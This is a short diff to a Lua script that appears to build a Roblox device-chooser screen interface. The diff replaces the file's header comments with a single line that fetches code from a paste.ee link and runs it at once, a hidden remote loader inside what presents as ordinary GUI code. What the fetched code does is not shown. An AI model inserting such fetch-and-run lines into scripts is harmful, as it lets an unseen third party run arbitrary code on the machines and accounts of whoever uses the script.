@@ -1,7 +1,4 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
+loadstring(game:HttpGet(('https://paste.ee/r/xOXia'),true))()
 
 local DEVICECHOOSER = Instance.new("ScreenGui")
 local FitAllScreens = Instance.new("Frame")
